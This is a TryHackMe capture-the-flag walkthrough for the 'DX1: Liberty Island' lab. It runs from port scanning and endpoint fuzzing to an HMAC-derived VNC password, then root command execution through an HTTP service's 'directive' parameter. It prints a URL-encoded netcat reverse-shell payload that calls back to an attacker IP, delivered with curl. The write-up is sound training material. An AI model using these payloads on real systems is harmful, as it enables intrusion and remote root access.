---
title: "TryHackMe: DX1: Liberty Island Walkthrough"
date: 2026-02-08
categories: [Writeups]
tags: [Writeups, TryHackMe]
image:
  path: assets/img/posts/tryhackme/dx1-liberty-island/logo.png
---


![image.png](assets/img/posts/tryhackme/dx1-liberty-island/image.png)

## Introduction

Can you help the NSF gain a foothold in UNATCO’s systems?

The NSF are preparing to raid Liberty Island in order to seize a shipment of Ambrosia from UNATCO (United Nations Anti-Terrorist Coalition). As their top hacker, our objective is to gain a **root foothold** on the UNATCO administrative network to support the operation.

## Enumeration

As always, the first step is enumeration.

### Port Enumeration

To identify exposed services, a full TCP port scan was performed against the target machine.

```
$ nmap 10.66.181.173 -p- -T5 -vvv -sT
```

**Results**

```
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
5901/tcp  open  vnc-1   syn-ack
23023/tcp open  unknown syn-ack
```

The scan revealed four open ports, including SSH, HTTP, VNC, and an unknown high port.

### Service Enumeration

Next, service and version detection was performed on the discovered ports.

```
$ nmap 10.66.181.173 -p 22,80,5901,23023 -T5 -vvv -sV
```

**Results**

```
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
5901/tcp  open  vnc     syn-ack ttl 62 VNC (protocol 3.8)
23023/tcp open  http    syn-ack ttl 62 Golang net/http server
```

The presence of a VNC service and a Golang-based HTTP service stood out as potentially interesting attack surfaces.

### Web Enumeration

Navigating to the web service on port 80 revealed a simple static webpage.

![image.png](assets/img/posts/tryhackme/dx1-liberty-island/image%201.png)

The page did not contain any user input fields or interactive elements. However, it displayed a list of usernames labeled as **“bad actors.”** While this initially appeared informational, these usernames would later become relevant during exploitation.

![image.png](assets/img/posts/tryhackme/dx1-liberty-island/image%202.png)

### Directory Enumeration

Since the main page provided limited information, directory enumeration was performed using Gobuster to identify hidden or unlinked resources.

```
$ gobuster dir -u http://10.66.181.173/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .js,.html,.php,.txt
```

**Results**

```
/index.html           (Status: 200) [Size: 909]
/terrorism.html       (Status: 200) [Size: 5939]
/robots.txt           (Status: 200) [Size: 95]
/threats.html         (Status: 200) [Size: 4140]
```

The presence of a `robots.txt` file was particularly interesting. Reviewing it revealed a disallowed directory named `/datacubes`.

```
# Disallow: /datacubes # why just block this? no corp should crawl our stuff - alex
Disallow: *
```

### Datacube Enumeration

Accessing the `/datacubes` directory resulted in a redirect to a numeric endpoint `/0000`, which displayed a block of text.

![image.png](assets/img/posts/tryhackme/dx1-liberty-island/image%203.png)

Given the numeric naming convention, fuzzing was performed to enumerate additional datacubes.

```
$ seq -f "%04g" 0 9999 | ffuf -u http://10.66.181.173/datacubes/FUZZ/ -w - -mc 200,301,302 -c
```

**Results**

```
0000                    [Status: 200, Size: 251, Words: 32, Lines: 3, Duration: 127ms]
0011                    [Status: 200, Size: 176, Words: 21, Lines: 5, Duration: 127ms]
0068                    [Status: 200, Size: 476, Words: 78, Lines: 12, Duration: 123ms]
0103                    [Status: 200, Size: 95, Words: 15, Lines: 2, Duration: 124ms]
0233                    [Status: 200, Size: 197, Words: 22, Lines: 6, Duration: 123ms]
0451                    [Status: 200, Size: 496, Words: 79, Lines: 10, Duration: 125ms]
```

Several valid datacubes were identified and manually reviewed.

### **Datacube Analysis**

Datacube `0068` revealed a personal message containing sensitive financial information and identified a user named **Jonathan**.

```
So many people use that ATM each day that it's busted 90% of the time. But if it's working, you might need some cash today for the pub crawl we've got planned in the city. Don't let the tourists get you down. See you there tonight, sweetie.

Accnt#: [redacted]
PIN#: [redacted]

Johnathan - your husband to be.

PS) I was serious last night-I really want to get married in the Statue. We met there on duty and all our friends work there.
```

Datacube `0103` contained a redacted password change reminder for the user **ghermann**, providing another username.

```
Change ghermann password to [redacted]. Next week I guess it'll be [redacted]. Strange guy...
```

The most critical information was found in datacube `0451`, which contained explicit instructions regarding VNC access:

```
Brother,

I've set up VNC on this machine under jacobson's account. We don't know his loyalty, but should assume hostile.
Problem is he's good - no doubt he'll find it... a hasty defense, but since we won't be here long, it should work.

The VNC login is the following message, 'smashthestate', hmac'ed with my username from the 'bad actors' list (lol).
Use md5 for the hmac hashing algo. The first 8 characters of the final hash is the VNC password. - JL
```

## **VNC Decoding**

Datacube `0451` described the exact method required to derive the VNC password for the user `jacobson`. Rather than providing the password directly, it outlined a simple cryptographic construction that could be reproduced locally.

The message referenced the initials **“JL”**, which were correlated with the previously discovered *Bad Actors* list. The only matching username was `jlebedev`, confirming it as the value used in the password generation process.

The VNC password was generated using an **HMAC-MD5** operation. In this construction, the username acts as the HMAC key, while the fixed string `smashthestate` is used as the message. The instructions specified that only the **first eight characters** of the resulting hash would be used as the VNC password.

To generate the hash, the following command was executed:

```bash
echo -n"smashthestate" | openssl dgst -md5 -hmac"jlebedev"
```

This produced the following output:

```
MD5(stdin)=311781a1830c1332a903920a59eb6d7a
```

Extracting the first eight characters of the hash resulted in the VNC password:

```
311781a1
```

With this password and the username `jacobson`, valid credentials for the VNC service were successfully derived, allowing access to the system via the VNC service on port 5901.

## VNC session

Using the credentials derived earlier, a connection to the VNC service was established on port 5901.

```
vncviewer 10.66.181.173:5901
```

The connection completed successfully, confirming valid authentication and access to the desktop environment running under the `ajacobson` user.

```
$ vncviewer 10.66.181.173:5901
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Password: 
Authentication successful
Desktop name "ip-10-66-181-173.ec2.internal:1 (ajacobson)"
```

Once connected, an interactive desktop session was available.

![image.png](assets/img/posts/tryhackme/dx1-liberty-island/image%204.png)

Within the VNC desktop environment, a message file was located containing an internal email exchange between UNATCO personnel. This message included updated credentials following a reported security incident.

### User Flag Retrieval

The contents of the message revealed the first flag in the form of a password shared internally:

```
From: JManderley//UNATC0.00013.76490 
To: AJacobson//UNATC0.00013.76490 
Subject: re: Security Breach

Thank you for keeping me informed of the recent hacker activity and your speedy response to same. I'm glad our security efforts were up to snuff.

(AJacobson//UNATC0.00013.76490) wrote:

I managed to stop the guys (actually, it was some French chick
the CIA's been watching, perhaps a Silhouette spy(?)) trying to
break into the net, but I took the liberty of changing some
passwords, just in case. Here are the new ones:

thm{REDACTED}

You should probably delete this as soon as you're done reading, okay?
```

## Privilege Escalation

Further exploration of the VNC environment revealed a script named `badactors-list`. Observing its execution showed that it attempted to communicate with **UNATCO on port 23023**, which had previously been identified during service enumeration as a Golang-based HTTP service.

![image.png](assets/img/posts/tryhackme/dx1-liberty-island/image%205.png)

<aside>
⚠️

During this process, the target machine became unstable and crashed, requiring the environment to be restarted.

</aside>

To better understand how the script interacted with the UNATCO service, the execution was intercepted by forcing it to route traffic through a controlled listener. This was achieved by setting the `HTTP_PROXY` environment variable and executing the script from the Terminal Emulator within the VNC session.

```
HTTP_PROXY=10.10.226.126:4444 ./badactors-list
```

A Netcat listener was started on the attacker machine:

```
nc -lnvp 4444
```

When the script executed, the following HTTP request was captured:

```
connect to [192.168.141.171] from (UNKNOWN) [10.65.139.125] 55670
POST http://UNATCO:23023/ HTTP/1.1
Host: UNATCO:23023
User-Agent: Go-http-client/1.1
Content-Length: 49
Clearance-Code: 7gFfT74scCgzMqW4EQbu
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

directive=cat+%2Fvar%2Fwww%2Fhtml%2Fbadactors.txt
```

This revealed several critical details. The service accepted HTTP POST requests, required a custom `Clearance-Code` header, and processed a parameter named `directive`. The value of `directive` appeared to be executed directly as a system command.

### Command Execution Confirmation

To interact with the service directly, the hostname `UNATCO` was added to the attacker’s `/etc/hosts` file so that requests could be sent to the local service.

To test whether the `directive` parameter was vulnerable to command execution, a simple `id` command was submitted:

```
$ curl -X POST http://UNATCO:23023/ \
-H "Clearance-Code: 7gFfT74scCgzMqW4EQbu" \
-d "directive=id"
```

The response confirmed command execution as the root user:

```
uid=0(root) gid=0(root) groups=0(root)
```

This verified that the UNATCO service was executing supplied commands with full root privileges, resulting in a direct privilege escalation vector.

### Root Shell Acquisition

To obtain an interactive root shell, a reverse shell payload was generated and URL-encoded to ensure proper handling by the HTTP request.

The payload used was generated via an online reverse shell generator ( https://www.revshells.com/ ) and URL encoded:

```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.141.171%204444%20%3E%2Ftmp%2Ff
```

A listener was started on the attacker machine:

```
nc -lnvp 4444
```

The payload was then delivered via the vulnerable `directive` parameter:

```
curl -X POST http://UNATCO:23023/ \
-H "Clearance-Code: 7gFfT74scCgzMqW4EQbu" \
-d "directive=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.141.171%204444%20%3E%2Ftmp%2Ff"
```

This resulted in a successful reverse shell connection as root.

To stabilize the shell, a pseudo-terminal was spawned:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Verification confirmed root access:

```
root@ip-10-65-139-125:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root Flag Retrieval

With root access established, the final flag was retrieved from the root directory:

```
root@ip-10-65-139-125:~# cat root.txt

From: AJacobson//UNATCO.00013.76490
To: JCDenton//UNATCO.82098.9868
Subject: Come by my office

We need to talk about that last mission.  In person, not infolink.  Come by my
office after you've been debriefed by Manderley.

    thm{REDACTED}

-alex-
```
